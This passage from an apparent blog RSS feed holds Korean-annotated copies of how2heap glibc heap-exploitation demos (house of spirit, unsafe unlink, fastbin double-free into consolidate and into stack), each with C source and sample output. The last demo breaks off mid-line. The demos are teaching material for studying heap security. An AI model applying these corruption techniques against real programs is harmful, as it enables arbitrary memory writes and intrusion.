class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"house of spirit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 한 번 호출해서 메모리를 설정한다.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역(메모리 길이: %lu)은 chunk가 2개 있다. 첫번째는 %p에서 시작하고 두번째는 %p에서 시작한다.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"*next* fake 영역의 chunk 크기는 온전해야 한다. 그것은 &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (main arena는 기본적으로 &lt; 128kb)이 nextsize 무결성 체크를 통과한다.그래서 fastbin 크기가 필요 없다.\n"</span>);</span><br><span class="line"><span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"overwrite된 포인터를 free한다.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"next malloc은 %p에 있는 fake chunk의 영역을 반환할 것이다. 그러면 %p이 될 것이다!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>house of spirit</code><br>malloc을 한 번 호출해서 메모리를 설정한다.<br>이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.<br>이 영역(메모리 길이: 80)은 chunk가 2개 있다. 첫번째는 <code>0x7fffffffe338</code>에서 시작하고 두번째는 <code>0x7fffffffe378</code>에서 시작한다.<br>이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.<br>이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, <code>0x7fffffffe338</code><br>overwrite된 포인터를 free한다.<br>-------free(a)-------<br>next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반환할 것이다. 그러면 <code>0x7fffffffe340</code>이 될 것이다!<br><code>malloc(0x30): 0x7fffffffe340</code></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] unsafe_unlink</title>
      <link>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/</guid>
      <pubDate>Wed, 29 May 2019 05:50:05 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;unsafe_unlinkc&quot;&gt;&lt;a class=&quot;markdow
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="unsafe_unlinkc"><a class="markdownIt-Anchor" href="#unsafe_unlinkc"></a> unsafe_unlink.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04/16.04 64bit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">// 우리는 fastbin을 사용하지 않을 정도로 커지고 싶다.</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"global chunk0_ptr: %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"corrupt할 victim chunk: %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 fake chunk를 생성한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 0x90이 될 것이다.\n"</span></span><br><span class="line"><span class="string">"그러나 이것은 새로운 값이다: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unlink 매크로 소스는 해당 링크에서 찾을 수 있다.\n"</span></span><br><span class="line"><span class="string">"https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"원래 값: %s\n"</span>,victim_string);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------chunk0_ptr[0]=0x4141414142424242LL-------"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 값: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[unsafe_unlink.c]</small></center><p><img src="https://user-images.githubusercontent.com/16969364/58533188-cb21ce00-8222-11e9-8f58-45c4f5c4657e.png" alt><br><img src="https://user-images.githubusercontent.com/16969364/58533397-5ac77c80-8223-11e9-923e-14828d385b91.PNG" alt><br><img src="https://user-images.githubusercontent.com/16969364/58533399-5b601300-8223-11e9-97f1-676a43e00fdd.PNG" alt></p><p><code>unsafe unlink 2.0!</code><br><code>테스트 환경: Ubuntu 14.04/16.04 64bit</code><br>이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.<br>대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.<br>이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.</p><p><code>global chunk0_ptr: 0x602070, pointing to 0x603010</code><br><code>corrupt할 victim chunk: 0x6030a0</code></p><p>chunk0에 fake chunk를 생성한다.<br>&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.<br>&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.<br>이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br><code>Fake chunk fd: 0x602058</code><br><code>Fake chunk bk: 0x602060</code></p><p>chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.<br>chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.<br>fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.<br>만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 <code>0x90</code>이 될 것이다.<br>그러나 이것은 새로운 값이다: <code>0x80</code><br>chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.</p><p>이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다</p><p>이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.<br>chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.<br><code>원래 값: Hello!~</code><br><code>-------chunk0_ptr[0]=0x4141414142424242LL-------</code><br><code>바뀐 값: BBBBAAAA</code></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup_into_consolidate</title>
      <link>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/</guid>
      <pubDate>Tue, 28 May 2019 05:15:29 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dup_into_consolidatec&quot;&gt;&lt;a
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dup_into_consolidatec"><a class="markdownIt-Anchor" href="#fastbin_dup_into_consolidatec"></a> fastbin_dup_into_consolidate.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fastbin을 두개 할당한다: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(p1)-------\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc_consolidate()를 trigger하기 위해 largebin을 할당한다: p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc_consolidate()에서 p1은 unsorted bin으로 이동한다.\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(p1)-------\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"double free 취약점을 trigger한다.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 p1이 fast-top에 있지 않기 때문에 malloc의 체크를 통과할 수 있다.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"현재 p1은 unsorted bin과 fastbin 안에 있다.\n"</span></span><br><span class="line">  <span class="string">"그래서 우리는 주소를 2번 얻을 수 있다: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_consolidate.c]</center></small><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58452763-7cf1c980-8153-11e9-92de-1a7cd4eb43bd.png"></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_consolidate.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup_into_stack</title>
      <link>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/</guid>
      <pubDate>Mon, 27 May 2019 12:36:51 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dup_into_stackc&quot;&gt;&lt;a class
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dup_into_stackc"><a class="markdownIt-Anchor" href="#fastbin_dup_into_stackc"></a> fastbin_dup_into_stack.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n"</span></span><br><span class="line"><span class="string">"이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc이 반환해야 할 주소: %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"버퍼를 3개 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(b)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p, %p, %p ]\n"</span></span><br><span class="line"><span class="string">"이제 %p(a)에 있는 데이터를 수정하여 공격할 것이다.\n"</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p ]\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 이게 free list의 head로 남아있는 동안 %p에 접근이 가능하다.\n"</span></span><br><span class="line"><span class="string">"그래서 stack에 fake free size(0x20)를 써준다.\n"</span></span><br><span class="line"><span class="string">"그러면 malloc은 거기에 free chunk가 있다고 생각할 것이고\n"</span></span><br><span class="line"><span class="string">"그곳으로 포인터를 반환할 것이다.\n"</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 %p에 있는 데이터의 처음 8바이트를 overwrite하여 0x20 바로 앞에 가리키도록 한다.\n"</span>, a);</span><br><span class="line">*d = 